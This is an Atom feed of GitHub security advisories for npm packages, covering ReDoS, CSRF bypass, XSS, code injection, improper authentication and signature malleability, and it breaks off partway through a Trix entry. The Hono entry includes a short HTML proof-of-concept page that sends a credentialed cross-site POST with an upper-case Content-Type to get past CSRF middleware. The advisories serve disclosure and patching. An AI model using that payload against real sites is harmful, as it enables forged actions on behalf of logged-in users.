<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-08-24T15:01:10.742Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[micromatch] Regular Expression Denial of Service (ReDoS) in micromatch]]></title>
        <id>https://github.com/advisories/GHSA-952p-6rrq-rcjv</id>
        <link href="https://github.com/advisories/GHSA-952p-6rrq-rcjv"/>
        <updated>2024-08-23T17:27:31.000Z</updated>
        <content type="html"><![CDATA[<p>The NPM package <code>micromatch</code> is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in <code>micromatch.braces()</code> in <code>index.js</code> because the pattern <code>.*</code> will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persists. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-4067">https://nvd.nist.gov/vuln/detail/CVE-2024-4067</a></li>
<li><a href="https://github.com/micromatch/micromatch/issues/243">https://github.com/micromatch/micromatch/issues/243</a></li>
<li><a href="https://github.com/micromatch/micromatch/pull/247">https://github.com/micromatch/micromatch/pull/247</a></li>
<li><a href="https://devhub.checkmarx.com/cve-details/CVE-2024-4067">https://devhub.checkmarx.com/cve-details/CVE-2024-4067</a></li>
<li><a href="https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448">https://github.com/micromatch/micromatch/blob/2c56a8604b68c1099e7bc0f807ce0865a339747a/index.js#L448</a></li>
<li><a href="https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0">https://github.com/micromatch/micromatch/commit/500d5d6f42f0e8dfa1cb5464c6cb420b1b6aaaa0</a></li>
<li><a href="https://github.com/advisories/GHSA-952p-6rrq-rcjv">https://github.com/advisories/GHSA-952p-6rrq-rcjv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-952p-6rrq-rcjv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-05-14T18:30:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hono] Hono CSRF middleware can be bypassed using crafted Content-Type header]]></title>
        <id>https://github.com/advisories/GHSA-rpfr-3m35-5vx5</id>
        <link href="https://github.com/advisories/GHSA-rpfr-3m35-5vx5"/>
        <updated>2024-08-22T16:41:09.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Hono CSRF middleware can be bypassed using crafted Content-Type header.</p>
<h3 id="details">Details</h3>
<p>MIME types are case insensitive, but <code>isRequestedByFormElementRe</code> only matches lower-case.</p>
<p><a href="https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17">https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17</a></p>
<p>As a result, attacker can bypass csrf middleware using upper-case form-like MIME type, such as "Application/x-www-form-urlencoded".</p>
<h3 id="poc">PoC</h3>
<pre><code class="language-html">&lt;html&gt;
  &lt;head&gt;
    &lt;title&gt;CSRF Test&lt;/title&gt;
    &lt;script defer&gt;
      document.addEventListener("DOMContentLoaded", () =&gt; {
        document.getElementById("btn").addEventListener("click", async () =&gt; {
          const res = await fetch("http://victim.example.com/test", {
            method: "POST",
            credentials: "include",
            headers: {
              "Content-Type": "Application/x-www-form-urlencoded",
            },
          });
        });
      });
    &lt;/script&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;CSRF Test&lt;/h1&gt;
    &lt;button id="btn"&gt;Click me!&lt;/button&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<h3 id="impact">Impact</h3>
<p>Bypass csrf protection implemented with hono csrf middleware.</p>
<h3 id="discussion">Discussion</h3>
<p>I'm not sure that omitting csrf checks for Simple POST request is a good idea.
CSRF prevention and CORS are different concepts even though CORS can prevent CSRF in some cases.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/honojs/hono/security/advisories/GHSA-rpfr-3m35-5vx5">https://github.com/honojs/hono/security/advisories/GHSA-rpfr-3m35-5vx5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43787">https://nvd.nist.gov/vuln/detail/CVE-2024-43787</a></li>
<li><a href="https://github.com/honojs/hono/commit/41ce840379516410dee60c783142e05bb5a22449">https://github.com/honojs/hono/commit/41ce840379516410dee60c783142e05bb5a22449</a></li>
<li><a href="https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17">https://github.com/honojs/hono/blob/b0af71fbcc6dbe44140ea76f16d68dfdb32a99a0/src/middleware/csrf/index.ts#L16-L17</a></li>
<li><a href="https://github.com/advisories/GHSA-rpfr-3m35-5vx5">https://github.com/advisories/GHSA-rpfr-3m35-5vx5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rpfr-3m35-5vx5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-22T16:41:08.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[squirrelly] squirrelly Code Injection vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-w5pw-gmcw-rfc8</id>
        <link href="https://github.com/advisories/GHSA-w5pw-gmcw-rfc8"/>
        <updated>2024-08-21T20:09:16.000Z</updated>
        <content type="html"><![CDATA[<p>squirrellyjs squirrelly v9.0.0 was discovered to contain a code injection vulnerability via the component <code>options.varName</code>. The issue was fixed in version 9.1.0.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-40453">https://nvd.nist.gov/vuln/detail/CVE-2024-40453</a></li>
<li><a href="https://github.com/squirrellyjs/squirrelly/pull/262">https://github.com/squirrellyjs/squirrelly/pull/262</a></li>
<li><a href="https://samuzora.com/posts/cve-2024-40453">https://samuzora.com/posts/cve-2024-40453</a></li>
<li><a href="https://github.com/squirrellyjs/squirrelly/commit/426f930e5ca1501404cd887071e734ec5feb0bcf">https://github.com/squirrellyjs/squirrelly/commit/426f930e5ca1501404cd887071e734ec5feb0bcf</a></li>
<li><a href="https://github.com/advisories/GHSA-w5pw-gmcw-rfc8">https://github.com/advisories/GHSA-w5pw-gmcw-rfc8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w5pw-gmcw-rfc8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-21T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckeditor4] CKEditor4 low-risk cross-site scripting (XSS) vulnerability linked to potential domain takeover]]></title>
        <id>https://github.com/advisories/GHSA-6v96-m24v-f58j</id>
        <link href="https://github.com/advisories/GHSA-6v96-m24v-f58j"/>
        <updated>2024-08-21T18:59:32.000Z</updated>
        <content type="html"><![CDATA[<h3 id="affected-packages">Affected Packages</h3>
<p>The issue impacts only editor instances with enabled <a href="https://ckeditor.com/docs/ckeditor4/latest/api/CKEDITOR_config.html#cfg-versionCheck">version notifications</a>.</p>
<p>Please note that this feature is disabled by default in all CKEditor 4 LTS versions. Therefore, if you use CKEditor 4 LTS, it is highly unlikely that you are affected by this vulnerability. If you are unsure, please <a href="mailto:security@cksource.com">contact us</a>.</p>
<h3 id="impact">Impact</h3>
<p>A theoretical vulnerability has been identified in CKEditor 4.22 (and above). In a highly unlikely scenario where an attacker gains control over the <a href="https://cke4.ckeditor.com">https://cke4.ckeditor.com</a> domain, they could potentially execute an attack on CKEditor 4 instances. Although the vulnerability is purely hypothetical, we have addressed it in CKEditor 4.25.0-lts to ensure compliance with security best practices.</p>
<h3 id="patches">Patches</h3>
<p>The issue has been recognized and patched. The fix is available in version 4.25.0-lts.</p>
<h3 id="for-more-information">For More Information</h3>
<p>If you have any questions or comments about this advisory, please email us at <a href="mailto:security@cksource.com">security@cksource.com</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ckeditor/ckeditor4/security/advisories/GHSA-6v96-m24v-f58j">https://github.com/ckeditor/ckeditor4/security/advisories/GHSA-6v96-m24v-f58j</a></li>
<li><a href="https://github.com/ckeditor/ckeditor4/commit/b5069c9cb769ea22eae1cbd7200f22b1cf2e3a7f">https://github.com/ckeditor/ckeditor4/commit/b5069c9cb769ea22eae1cbd7200f22b1cf2e3a7f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43411">https://nvd.nist.gov/vuln/detail/CVE-2024-43411</a></li>
<li><a href="https://github.com/advisories/GHSA-6v96-m24v-f58j">https://github.com/advisories/GHSA-6v96-m24v-f58j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6v96-m24v-f58j</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-21T18:31:00.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ckeditor4] Code Snippet GeSHi plugin has reflected cross-site scripting (XSS) vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7r32-vfj5-c2jv</id>
        <link href="https://github.com/advisories/GHSA-7r32-vfj5-c2jv"/>
        <updated>2024-08-21T18:30:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="affected-packages">Affected packages</h3>
<p>The vulnerability has been discovered in <a href="https://ckeditor.com/cke4/addon/codesnippetgeshi">Code Snippet GeSHi</a> plugin. All integrators that use <a href="https://github.com/GeSHi/geshi-1.0">GeSHi syntax highlighter</a> on the backend side can be affected.</p>
<h3 id="impact">Impact</h3>
<p>A potential vulnerability has been discovered in CKEditor 4 <a href="https://ckeditor.com/cke4/addon/codesnippetgeshi">Code Snippet GeSHi</a> plugin. The vulnerability allowed a reflected XSS attack by exploiting a flaw in the <a href="https://github.com/GeSHi/geshi-1.0">GeSHi syntax highlighter library</a> hosted by the victim.</p>
<p>The GeSHi library was included as a vendor dependency in CKEditor 4 source files. In a specific scenario, an attacker could craft a malicious script that could be executed by sending a request to the GeSHi library hosted on a PHP web server.</p>
<h3 id="patches">Patches</h3>
<p>The <a href="https://github.com/GeSHi/geshi-1.0">GeSHi library</a> is no longer actively maintained. Due to the lack of ongoing support and updates, potential security vulnerabilities have been identified with its continued use. To mitigate these risks and enhance the overall security of the CKEditor 4, we have decided to completely remove the GeSHi library as a dependency. This change aims to maintain a secure environment and reduce the risk of any security incidents related to outdated or unsupported software.</p>
<p>To integrators who still want to use the GeSHi syntax highlighter, we recommend manually adding the <a href="https://github.com/GeSHi/geshi-1.0">GeSHi library</a> . Please be aware of and understand the potential security vulnerabilities associated with its use.</p>
<p>The fix is be available in version 4.25.0-lts.</p>
<h3 id="acknowledgements">Acknowledgements</h3>
<p>The CKEditor 4 team would like to thank <a href="https://github.com/Hebing123">Jiasheng He</a> from Qihoo 360 for recognizing and reporting this vulnerability.</p>
<h3 id="for-more-information">For more information</h3>
<p>Email us at <a href="mailto:security@cksource.com">security@cksource.com</a> if you have any questions or comments about this advisory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/ckeditor/ckeditor4/security/advisories/GHSA-7r32-vfj5-c2jv">https://github.com/ckeditor/ckeditor4/security/advisories/GHSA-7r32-vfj5-c2jv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43407">https://nvd.nist.gov/vuln/detail/CVE-2024-43407</a></li>
<li><a href="https://github.com/ckeditor/ckeditor4/commit/71072c9f7f263329841bd38e7e5309074c82ef94">https://github.com/ckeditor/ckeditor4/commit/71072c9f7f263329841bd38e7e5309074c82ef94</a></li>
<li><a href="https://github.com/ckeditor/ckeditor4/commit/951e7d75fcbcaa2590b0719fb0bb0dd0539ca6fa">https://github.com/ckeditor/ckeditor4/commit/951e7d75fcbcaa2590b0719fb0bb0dd0539ca6fa</a></li>
<li><a href="https://github.com/advisories/GHSA-7r32-vfj5-c2jv">https://github.com/advisories/GHSA-7r32-vfj5-c2jv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7r32-vfj5-c2jv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-21T18:29:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[@tryghost/portal] Ghost's improper authentication allows access to member information and actions]]></title>
        <id>https://github.com/advisories/GHSA-78x2-cwp9-5j42</id>
        <link href="https://github.com/advisories/GHSA-78x2-cwp9-5j42"/>
        <updated>2024-08-20T20:04:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper authentication on some endpoints used for member actions would allow an attacker to perform member-only actions, and read member information.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This security vulnerability is present in Ghost v4.46.0-v5.89.5.</p>
<h3 id="patches">Patches</h3>
<p>v5.89.5 contains a fix for this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@ghost.org">security@ghost.org</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-78x2-cwp9-5j42">https://github.com/TryGhost/Ghost/security/advisories/GHSA-78x2-cwp9-5j42</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43409">https://nvd.nist.gov/vuln/detail/CVE-2024-43409</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/dac25612520b571f58679764ecc27109e641d1db">https://github.com/TryGhost/Ghost/commit/dac25612520b571f58679764ecc27109e641d1db</a></li>
<li><a href="https://github.com/advisories/GHSA-78x2-cwp9-5j42">https://github.com/advisories/GHSA-78x2-cwp9-5j42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78x2-cwp9-5j42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T20:04:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ghost] Ghost's improper authentication allows access to member information and actions]]></title>
        <id>https://github.com/advisories/GHSA-78x2-cwp9-5j42</id>
        <link href="https://github.com/advisories/GHSA-78x2-cwp9-5j42"/>
        <updated>2024-08-20T20:04:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Improper authentication on some endpoints used for member actions would allow an attacker to perform member-only actions, and read member information.</p>
<h3 id="vulnerable-versions">Vulnerable versions</h3>
<p>This security vulnerability is present in Ghost v4.46.0-v5.89.5.</p>
<h3 id="patches">Patches</h3>
<p>v5.89.5 contains a fix for this issue.</p>
<h3 id="workarounds">Workarounds</h3>
<p>None.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@ghost.org">security@ghost.org</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/TryGhost/Ghost/security/advisories/GHSA-78x2-cwp9-5j42">https://github.com/TryGhost/Ghost/security/advisories/GHSA-78x2-cwp9-5j42</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43409">https://nvd.nist.gov/vuln/detail/CVE-2024-43409</a></li>
<li><a href="https://github.com/TryGhost/Ghost/commit/dac25612520b571f58679764ecc27109e641d1db">https://github.com/TryGhost/Ghost/commit/dac25612520b571f58679764ecc27109e641d1db</a></li>
<li><a href="https://github.com/advisories/GHSA-78x2-cwp9-5j42">https://github.com/advisories/GHSA-78x2-cwp9-5j42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-78x2-cwp9-5j42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T20:04:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[matrix-js-sdk] matrix-js-sdk will freeze when a user sets a room with itself as a its predecessor]]></title>
        <id>https://github.com/advisories/GHSA-vhr5-g3pm-49fm</id>
        <link href="https://github.com/advisories/GHSA-vhr5-g3pm-49fm"/>
        <updated>2024-08-20T18:35:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious homeserver can craft a room or room structure such that the predecessors form a cycle. The matrix-js-sdk's <code>getRoomUpgradeHistory</code> function will infinitely recurse in this case, causing the code to hang. This method is public but also called by the 'leaveRoomChain()' method, so leaving a room will also trigger the bug.</p>
<p>Even if the CVSS score would be 4.1 (<a href="https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:N/A:L&amp;version=3.1">AV:N/AC:L/PR:L/UI:R/S:C/C:N/I:N/A:L</a>) we classify this as High severity issue.</p>
<h3 id="patches">Patches</h3>
<p>This was patched in matrix-js-sdk 34.3.1.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Sanity check rooms before passing them to the matrix-js-sdk or avoid calling either <code>getRoomUpgradeHistory</code> or <code>leaveRoomChain</code>.</p>
<h3 id="references">References</h3>
<p>N/A.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-vhr5-g3pm-49fm">https://github.com/matrix-org/matrix-js-sdk/security/advisories/GHSA-vhr5-g3pm-49fm</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42369">https://nvd.nist.gov/vuln/detail/CVE-2024-42369</a></li>
<li><a href="https://github.com/matrix-org/matrix-js-sdk/commit/a0efed8b881b3db6c9f2c71d6a6e74c2828978c6">https://github.com/matrix-org/matrix-js-sdk/commit/a0efed8b881b3db6c9f2c71d6a6e74c2828978c6</a></li>
<li><a href="https://github.com/advisories/GHSA-vhr5-g3pm-49fm">https://github.com/advisories/GHSA-vhr5-g3pm-49fm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vhr5-g3pm-49fm</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-20T18:35:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Improper access control in Directus]]></title>
        <id>https://github.com/advisories/GHSA-q83v-hq3j-4pq3</id>
        <link href="https://github.com/advisories/GHSA-q83v-hq3j-4pq3"/>
        <updated>2024-08-19T21:03:40.000Z</updated>
        <content type="html"><![CDATA[<p>Directus v10.13.0 allows an authenticated external attacker to modify presets created by the same user to assign them to another user. This is possible because the application only validates the user parameter in the 'POST /presets'&nbsp;request but not in the PATCH request. When chained with CVE-2024-6533, it could result in account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6534">https://nvd.nist.gov/vuln/detail/CVE-2024-6534</a></li>
<li><a href="https://directus.io">https://directus.io</a></li>
<li><a href="https://fluidattacks.com/advisories/capaldi">https://fluidattacks.com/advisories/capaldi</a></li>
<li><a href="https://github.com/advisories/GHSA-q83v-hq3j-4pq3">https://github.com/advisories/GHSA-q83v-hq3j-4pq3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q83v-hq3j-4pq3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T06:32:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[directus] Code injection in Directus]]></title>
        <id>https://github.com/advisories/GHSA-qf6h-p3mr-vmh5</id>
        <link href="https://github.com/advisories/GHSA-qf6h-p3mr-vmh5"/>
        <updated>2024-08-19T21:03:11.000Z</updated>
        <content type="html"><![CDATA[<p>Directus v10.13.0 allows an authenticated external attacker to execute arbitrary JavaScript on the client. This is possible because the application injects an attacker-controlled parameter that will be stored in the server and used by the client into an unsanitized DOM element. When chained with CVE-2024-6534, it could result in account takeover.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6533">https://nvd.nist.gov/vuln/detail/CVE-2024-6533</a></li>
<li><a href="https://directus.io">https://directus.io</a></li>
<li><a href="https://fluidattacks.com/advisories/bocelli">https://fluidattacks.com/advisories/bocelli</a></li>
<li><a href="https://github.com/advisories/GHSA-qf6h-p3mr-vmh5">https://github.com/advisories/GHSA-qf6h-p3mr-vmh5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qf6h-p3mr-vmh5</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-15T03:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[gettext.js] gettext.js has a Cross-site Scripting injection ]]></title>
        <id>https://github.com/advisories/GHSA-vwhg-jwr4-vxgg</id>
        <link href="https://github.com/advisories/GHSA-vwhg-jwr4-vxgg"/>
        <updated>2024-08-16T18:15:40.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Possible vulnerability to XSS injection if .po dictionary definition files is corrupted</p>
<h3 id="patches">Patches</h3>
<p>Update gettext.js to 2.0.3</p>
<h3 id="workarounds">Workarounds</h3>
<p>Make sure you control the origin of the definition catalog to prevent the use of this flaw in the definition of plural forms.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/guillaumepotier/gettext.js/security/advisories/GHSA-vwhg-jwr4-vxgg">https://github.com/guillaumepotier/gettext.js/security/advisories/GHSA-vwhg-jwr4-vxgg</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-43370">https://nvd.nist.gov/vuln/detail/CVE-2024-43370</a></li>
<li><a href="https://github.com/guillaumepotier/gettext.js/commit/8150aeba833183e14c2291a8a148b8f79d1d68d8">https://github.com/guillaumepotier/gettext.js/commit/8150aeba833183e14c2291a8a148b8f79d1d68d8</a></li>
<li><a href="https://github.com/advisories/GHSA-vwhg-jwr4-vxgg">https://github.com/advisories/GHSA-vwhg-jwr4-vxgg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vwhg-jwr4-vxgg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-15T18:06:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic's EDDSA missing signature length check]]></title>
        <id>https://github.com/advisories/GHSA-f7q4-pwc6-w24p</id>
        <link href="https://github.com/advisories/GHSA-f7q4-pwc6-w24p"/>
        <updated>2024-08-15T17:53:40.000Z</updated>
        <content type="html"><![CDATA[<p>In the Elliptic package 6.5.6 for Node.js, EDDSA signature malleability occurs because there is a missing signature length check, and thus zero-valued bytes can be removed or appended.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42459">https://nvd.nist.gov/vuln/detail/CVE-2024-42459</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/317">https://github.com/indutny/elliptic/pull/317</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/c0690b36be043ee73c1780ae4b7df48632b11cf9">https://github.com/indutny/elliptic/commit/c0690b36be043ee73c1780ae4b7df48632b11cf9</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11">https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11</a></li>
<li><a href="https://github.com/advisories/GHSA-f7q4-pwc6-w24p">https://github.com/advisories/GHSA-f7q4-pwc6-w24p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f7q4-pwc6-w24p</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-02T09:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic's ECDSA missing check for whether leading bit of r and s is zero]]></title>
        <id>https://github.com/advisories/GHSA-977x-g7h5-7qgw</id>
        <link href="https://github.com/advisories/GHSA-977x-g7h5-7qgw"/>
        <updated>2024-08-15T17:53:06.000Z</updated>
        <content type="html"><![CDATA[<p>In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because there is a missing check for whether the leading bit of r and s is zero.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42460">https://nvd.nist.gov/vuln/detail/CVE-2024-42460</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/317">https://github.com/indutny/elliptic/pull/317</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/b6ff1758d9a6d1a7aec177ff6df9f586492a6315">https://github.com/indutny/elliptic/commit/b6ff1758d9a6d1a7aec177ff6df9f586492a6315</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11">https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11</a></li>
<li><a href="https://github.com/advisories/GHSA-977x-g7h5-7qgw">https://github.com/advisories/GHSA-977x-g7h5-7qgw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-977x-g7h5-7qgw</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-02T09:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Elliptic allows BER-encoded signatures]]></title>
        <id>https://github.com/advisories/GHSA-49q7-c7j4-3p7m</id>
        <link href="https://github.com/advisories/GHSA-49q7-c7j4-3p7m"/>
        <updated>2024-08-15T17:52:30.000Z</updated>
        <content type="html"><![CDATA[<p>In the Elliptic package 6.5.6 for Node.js, ECDSA signature malleability occurs because BER-encoded signatures are allowed.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42461">https://nvd.nist.gov/vuln/detail/CVE-2024-42461</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/317">https://github.com/indutny/elliptic/pull/317</a></li>
<li><a href="https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11">https://github.com/indutny/elliptic/commit/accb61e9c1a005e5c8ff96a8b33893100bb42d11</a></li>
<li><a href="https://github.com/advisories/GHSA-49q7-c7j4-3p7m">https://github.com/advisories/GHSA-49q7-c7j4-3p7m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49q7-c7j4-3p7m</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-08-02T09:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[node-ipc] node-ipc behavior change]]></title>
        <id>https://github.com/advisories/GHSA-3mpp-xfvh-qh37</id>
        <link href="https://github.com/advisories/GHSA-3mpp-xfvh-qh37"/>
        <updated>2024-08-14T22:13:15.000Z</updated>
        <content type="html"><![CDATA[<p>node-ipc starting in version 11.0.0 and prior to version 12.0.0 includes a message from the maintainer that is written to the user’s desktop. Please review the version changes before proceeding.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/RIAEvangelist/node-ipc/releases/tag/v11.0.0">https://github.com/RIAEvangelist/node-ipc/releases/tag/v11.0.0</a></li>
<li><a href="https://github.com/RIAEvangelist/node-ipc/commit/a98efaedbf090d7bf4d6bdf07761301c531608af">https://github.com/RIAEvangelist/node-ipc/commit/a98efaedbf090d7bf4d6bdf07761301c531608af</a></li>
<li><a href="https://github.com/RIAEvangelist/node-ipc/compare/10.1.0...12.0.0">https://github.com/RIAEvangelist/node-ipc/compare/10.1.0...12.0.0</a></li>
<li><a href="https://github.com/advisories/GHSA-3mpp-xfvh-qh37">https://github.com/advisories/GHSA-3mpp-xfvh-qh37</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3mpp-xfvh-qh37</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2022-03-16T23:54:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[trix] Trix has a cross-site Scripting vulnerability on copy & paste ]]></title>
        <id>https://github.com/advisories/GHSA-qm2q-9f3q-2vcv</id>
        <link href="https://github.com/advisories/GHSA-qm2q-9f3q-2vcv"/>
        <updated>2024-08-15T16:58:48.000Z</updated>
